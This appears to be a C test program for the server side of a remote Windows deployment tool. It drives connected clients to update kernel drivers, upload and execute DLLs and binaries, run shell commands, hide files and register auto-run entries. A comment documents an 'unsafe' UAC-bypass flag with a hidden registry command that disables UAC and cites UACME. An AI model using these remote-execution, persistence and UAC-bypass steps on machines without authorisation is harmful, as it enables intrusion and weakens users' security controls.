/*
	Author: Axt Müller
	Description: Windows-Batch-Deployment DLL function test.
	Note: This file can be modified at will, but improper operation(s) will cause BSOD on the client(s).
*/
#include <stdio.h>
#include <Windows.h>
#include "template.h"
#include "test.h"

//If this macro is enbled, the test code will execute continuously for each client.
//#define CLIENT_STABILITY_TEST

//If this macro is enbled, the program will not the update the binary file of the client.
//#define DO_NOT_UPDATE_CLIENT

void __stdcall FunctionTest(PCLIENT_INFO p, char *szClientVersion)
{
	//======================================================================
	//Client configuration (ClientConfig)
	//======================================================================
	WCHAR file[MAX_PATH] = {0};
	WCHAR path[MAX_PATH] = {0};
	GetModuleFileNameW(0, path, MAX_PATH);
	for(SIZE_T i=wcslen(path)-1; i>=0; i--)
	{
		if(path[i]=='\\')
		{
			path[i+1]='\0';
			break;
		}
	}
	wcscpy(file, path);
	wcscat(file, L"test.cfg");
	if(_ClientConfig(p->id, CLIENT_CONFIG_SERVER, file))
	{
		printf("[%04ld]Configure client successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Configure client unsuccessfully.\n", p->id);
		goto __exit;
	}
	//======================================================================
	//Client update (ClientUpdate)
	//======================================================================
	wcscpy(file, path);
#ifndef DO_NOT_UPDATE_CLIENT
	//Update the client binary file if new client binary is available.
	if(g_szLatestClientVersion[0]!=0)
	{
		if(strstr(p->szDescription, "(WIN32-"))
		{
			wcscat(file, L"LatestClient32.sys");
		}
		else
		{
			wcscat(file, L"LatestClient64.sys");
		}
		if(stricmp(g_szLatestClientVersion, szClientVersion))
		{
			printf("[%04ld]THE CLIENT NEED TO BE UPDATED.\n", p->id);
			if(_ClientUpdate(p->id, file))
			{
				printf("[%04ld]Update client successfully.\n", p->id);
				strcpy(szClientVersion, g_szLatestClientVersion);
			}
			else
			{
				printf("[%04ld]Update client unsuccessfully.\n", p->id);
				goto __exit;
			}
		}
		else
		{
			printf("[%04ld]THE CLIENT DOES NOT NEED TO BE UPDATED.\n", p->id);
		}
	}
	else
	{
		//Update the client binary file anyway, for testing purposes only.
		if(strstr(p->szDescription, "(WIN32-"))
		{
			wcscat(file, L"UpdateTest32.sys");
		}
		else
		{
			wcscat(file, L"UpdateTest64.sys");
		}
		if(_ClientUpdate(p->id, file))
		{
			printf("[%04ld]Update client (test) successfully.\n", p->id);
			strcpy(szClientVersion, g_szLatestClientVersion);
		}
		else
		{
			printf("[%04ld]Update client (test) unsuccessfully.\n", p->id);
			goto __exit;
		}
	}
#endif
	//======================================================================
	//File transmission (CmdQueryDirectory + CmdUploadFileTo + CmdDownloadFileFrom)
	//======================================================================
	BOOLEAN bNeedExit = 0;
	ULONG dwFiles = 0;
	WCHAR wsDir[MAX_PATH] = L"C:\\windows\\";
	WCHAR wsAppPath[MAX_PATH] = {0};
	//Query program path.
	if(GetModuleFileNameW(0, wsAppPath, MAX_PATH))
	{
		size_t i, c = wcslen(wsAppPath);
		for(i=c-1; i>=0; i--)
		{
			if(wsAppPath[i]==L'\\')
			{
				wsAppPath[i+1]=L'\0';
				break;
			}
		}
	}
	else
	{
		printf("[%04ld]Query program path unsuccessfully.\n", p->id);
		goto __exit;
	}
	//Query file of WINDOWS directory.
	if(_CmdQueryDirectory(p->id, wsDir, NULL, &dwFiles))
	{
		printf("[%04ld]Enumerate directory successfully, number of files: %ld.\n", p->id, dwFiles);
		//Allocate file buffer
		PBDP_FILE_INFO pFiles = (PBDP_FILE_INFO)MALLOC(sizeof(BDP_FILE_INFO) * dwFiles);
		if(pFiles)
		{
			RtlZeroMemory(pFiles, sizeof(BDP_FILE_INFO) * dwFiles);
			if(_CmdQueryDirectory(p->id, wsDir, pFiles, &dwFiles))
			{
				for(ULONG i=0; i<dwFiles; i++)
				{
					if(pFiles[i].FileSize==0xFFFFFFFFFFFFFFFF)
					{
						printf("[%04ld][D](%ld): %S.\n", p->id, i, pFiles[i].FileName);
					}
					else
					{
						printf("[%04ld][F](%ld): %S.\n", p->id, i, pFiles[i].FileName);
					}
				}
			}
			else
			{
				printf("[%04ld]Enumerate directory unsuccessfully.\n", p->id);
				bNeedExit = 1;
			}
			FREE(pFiles);
		}
		if(bNeedExit)
		{
			goto __exit;
		}
	}
	else
	{
		printf("[%04ld]Query directory file count unsuccessfully.\n", p->id);
		goto __exit;
	}
	//Download NTOSKRNL file.
	WCHAR wsRF[MAX_PATH] = L"c:\\windows\\system32\\ntoskrnl.exe";
	WCHAR wsLF[MAX_PATH] = {0};
	swprintf(wsLF, MAX_PATH, L"c:\\[%S]ntoskrnl.exe", p->szDescription);
	if(_CmdDownloadFileFrom(p->id, wsRF, wsLF, NULL))
	{
		printf("[%04ld]Download file successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Download file unsuccessfully.\n", p->id);
		goto __exit;
	}
	//Upload test DLL file.
	wcscpy(wsRF, L"c:\\test.dll");
	wcscpy(wsLF, wsAppPath);
	if(strstr(p->szDescription, "(WIN32-"))
	{
		wcscat(wsLF, L"UserDemo32.dll");
	}
	else
	{
		wcscat(wsLF, L"UserDemo64.dll");
	}
	if(_CmdUploadFileTo(p->id, wsLF, wsRF, NULL))
	{
		printf("[%04ld]Upload file successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Upload file unsuccessfully.\n", p->id);
		goto __exit;
	}
	//======================================================================
	//File operation (CmdFileOperation)
	//======================================================================
	ULONG AttrVal;
	//Clean up last test
	_CmdFileOperation(p->id, CLIENT_FSO_DELETE, L"C:\\22222222", NULL, NULL);
	//Create directory.
	if(_CmdFileOperation(p->id, CLIENT_FSO_CREATE_DIRECTORY, L"c:\\00000000", NULL, NULL))
	{
		printf("[%04ld]Create directory successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Create directory unsuccessfully.\n", p->id);
		goto __exit;
	}
	//Create file (file content can be NULL).
	if(_CmdFileOperation(p->id, CLIENT_FSO_CREATE_FILE, L"c:\\00000000\\test.TXT", L"Hello,World!", NULL))
	{
		printf("[%04ld]Create file successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Create file unsuccessfully.\n", p->id);
		goto __exit;
	}
	//Copy file or directory.
	if(_CmdFileOperation(p->id, CLIENT_FSO_COPY, L"C:\\WINDOWS\\WEB", L"C:\\11111111", NULL))
	{
		printf("[%04ld]Copy directory successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Copy directory unsuccessfully.\n", p->id);
		goto __exit;
	}
	//Rename file or directory.
	if(_CmdFileOperation(p->id, CLIENT_FSO_RENAME, L"C:\\11111111", L"C:\\22222222", NULL))
	{
		printf("[%04ld]Rename directory successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Rename directory unsuccessfully.\n", p->id);
		goto __exit;
	}
	//Delete file or directory.
	if(_CmdFileOperation(p->id, CLIENT_FSO_DELETE, L"C:\\00000000", NULL, NULL))
	{
		printf("[%04ld]Delete directory successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Delete directory unsuccessfully.\n", p->id);
		goto __exit;
	}
	//Set attribute of file or directory (you need to convert the file attribute value to a string).
	WCHAR wsAttr[10] = {0};
	_itow(FILE_ATTRIBUTE_HIDDEN, wsAttr, 10);
	if(_CmdFileOperation(p->id, CLIENT_FSO_SET_ATTRIB, L"C:\\22222222", wsAttr, NULL))
	{
		printf("[%04ld]Set file attribute successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Set file attribute unsuccessfully.\n", p->id);
		goto __exit;
	}
	//Query attribute of file or directory.
	if(_CmdFileOperation(p->id, CLIENT_FSO_GET_ATTRIB, L"C:\\22222222", NULL, &AttrVal))
	{
		printf("[%04ld]Query file attribute successfully: 0x%X.\n", p->id, AttrVal);
	}
	else
	{
		printf("[%04ld]Query file attribute unsuccessfully.\n", p->id);
		goto __exit;
	}
	//Download file via HTTP link.
	if(_CmdFileOperation(p->id, CLIENT_FSO_HTTP_DOWNLOAD, L"http://www.w3.org/Icons/w3c_home", L"C:\\22222222\\logo.png", &AttrVal))
	{
		printf("[%04ld]Download file successfully: 0x%X.\n", p->id, AttrVal);
	}
	else
	{
		printf("[%04ld]Download file unsuccessfully.\n", p->id);
		goto __exit;
	}
	//======================================================================
	//Binary execution (CmdExecuteBinary)
	//======================================================================
	ULONG64 RetVal;
	//You must use the full path name of the driver file.
	if(_CmdExecuteBinary(p->id, L"c:\\windows\\system32\\drivers\\usb8023.sys", CLIENT_RUN_SYS_P1, CLIENT_RUN_SYS_P2, &RetVal))
	{
		printf("[%04ld]Load SYS successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Load SYS unsuccessfully.\n", p->id);
	}
	//You can add command line arguments after the program path name.
	if(_CmdExecuteBinary(p->id, L"c:\\windows\\system32\\taskmgr.exe", SW_SHOWMINIMIZED, 0, &RetVal))
	{
		//NOTE1: If UAC is enabled, TaskMgr will not run successfully, because it requires administrative privileges.
		//NOTE2: If you add CLIENT_BYPASS_UAC_UNSAFE to the third parameter,
		//       it can create a process that requires administrative privileges,
		//       but it may cause some systems to crash after multiple (>10) uses.
		//       DEMO: _CmdExecuteBinary(p->id, L"reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f", SW_HIDE+CLIENT_BYPASS_UAC_UNSAFE, 0, &RetVal);
		//NOTE3: You can use the code of the UACME project to bypass UAC in your program, it will not cause the system to crash.
		printf("[%04ld]Run EXE successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Run EXE unsuccessfully.\n", p->id);
	}
	//You must write an exported function name after the DLL path name (separated by comma), otherwise the DLL will not be loaded.
	if(_CmdExecuteBinary(p->id, L"c:\\test.dll,0", CLIENT_RUN_DLL_P1, CLIENT_RUN_DLL_P2, &RetVal))
	{
		printf("[%04ld]Load DLL successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Load DLL unsuccessfully.\n", p->id);
	}
	//======================================================================
	//System shell (CmdSystemShell)
	//======================================================================
	char cmdtxt[1024] = {0};
	//If the command does not complete within a certain time, the function will return with empty string.
	if(_CmdSystemShell(p->id, L"type c:\\windows\\win.ini", cmdtxt, 1024))
	{
		printf("[%04ld]Run CMD successfully.\n%s\n\n", p->id, cmdtxt);
	}
	else
	{
		printf("[%04ld]Run CMD unsuccessfully.\n", p->id);
	}
	//======================================================================
	//Auto-Run operation (CmdAddAutoRunBin + CmdDelAutoRunBin + CmdQueryAutoRunBin + CmdClearAutoRunBin)
	//======================================================================
	//Add binaries to Auto-Run list.
	PWCHAR names = NULL;
	if(_CmdAddAutoRunBin(p->id, CLIENT_AUTORUN_TYPE_SYS, L"USB8023", L"c:\\windows\\system32\\drivers\\USB8023.SYS", NULL))
	{
		printf("[%04ld]Add auto-run successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Add auto-run unsuccessfully.\n", p->id);
		goto __exit;
	}
	if(_CmdAddAutoRunBin(p->id, CLIENT_AUTORUN_TYPE_SYS, L"BRIDGE", L"c:\\windows\\system32\\drivers\\BRIDGE.SYS", NULL))
	{
		printf("[%04ld]Add auto-run successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Add auto-run unsuccessfully.\n", p->id);
		goto __exit;
	}
	if(_CmdAddAutoRunBin(p->id, CLIENT_AUTORUN_TYPE_EXE, L"WRITE", L"c:\\windows\\system32\\WRITE.EXE", L"c:\\windows\\win.ini"))
	{
		printf("[%04ld]Add auto-run successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Add auto-run unsuccessfully.\n", p->id);
		goto __exit;
	}
	if(_CmdAddAutoRunBin(p->id, CLIENT_AUTORUN_TYPE_DLL, L"SHELL32", L"c:\\windows\\system32\\SHELL32.DLL", L"Control_RunDLL intl.cpl,,1"))
	{
		printf("[%04ld]Add auto-run successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Add auto-run unsuccessfully.\n", p->id);
		goto __exit;
	}
	//Enumerate Auto-Run list.
	if(_CmdQueryAutoRunBin(p->id, CLIENT_AUTORUN_TYPE_SYS, &names))
	{
		PWCHAR ptr = names;
		while(1)
		{
			if(wcslen(ptr)==0)break;
			printf("[%04ld][EnumAutoRun1]%S.\n", p->id, ptr);
			ptr = ptr + wcslen(ptr)+1;
		}
		FREE(names);
	}
	else
	{
		printf("[%04ld]Query auto-run unsuccessfully.\n", p->id);
		goto __exit;
	}
	//Delete USB8023 from Auto-Run list.
	if(_CmdDelAutoRunBin(p->id, CLIENT_AUTORUN_TYPE_SYS, L"USB8023"))
	{
		printf("[%04ld]Delete auto-run successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Delete auto-run unsuccessfully.\n", p->id);
		goto __exit;
	}
	//Enumerate Auto-Run list again to show the effect.
	if(_CmdQueryAutoRunBin(p->id, CLIENT_AUTORUN_TYPE_SYS, &names))
	{
		PWCHAR ptr = names;
		while(1)
		{
			if(wcslen(ptr)==0)break;
			printf("[%04ld][EnumAutoRun2]%S.\n", p->id, ptr);
			ptr = ptr + wcslen(ptr)+1;
		}
		FREE(names);
	}
	else
	{
		printf("[%04ld]Query auto-run unsuccessfully.\n", p->id);
		goto __exit;
	}
	//Delete everything from Auto-Run list.
	if(_CmdClearAutoRunBin(p->id, CLIENT_AUTORUN_TYPE_SYS))
	{
		printf("[%04ld]Clear auto-run successfully.\n", p->id);
	}
	else
	{
		printf("[%04ld]Clear auto-run unsuccessfully.\n", p->id);
		goto __exit;
	}
	//Enumerate Auto-Run list again to show the effect.
	if(_CmdQueryAutoRunBin(p->id, CLIENT_AUTORUN_TYPE_SYS, &names))
	{
		PWCHAR ptr = names;
		while(1)
		{
			if(wcslen(ptr)==0)break;
			printf("[%04ld][EnumAutoRun3]%S.\n", p->id, ptr);
			ptr = ptr + wcslen(ptr)+1;
		}
		FREE(names);
	}
	else
	{
		printf("[%04ld]Query auto-run unsuccessfully.\n", p->id);
		goto __exit;
	}
__exit:;
}

void main()
{
	BOOLEAN bCheckUpdate;
	BOOLEAN bOnlyConnectOnce;
	//If update checking is needed, set bCheckUpdate to 1.
#ifdef DO_NOT_UPDATE_CLIENT
	bCheckUpdate = FALSE;
#else
	bCheckUpdate = TRUE;
#endif
	//If client stability testing is needed, set bOnlyConnectOnce to 0.
#ifdef CLIENT_STABILITY_TEST
	bOnlyConnectOnce = FALSE;
#else
	bOnlyConnectOnce = TRUE;
#endif
	//Start the function test.
	CreateSimpleServer(9999, FunctionTest, bCheckUpdate, bOnlyConnectOnce, 0, USN_PAGE_SIZE);
	system("pause");
}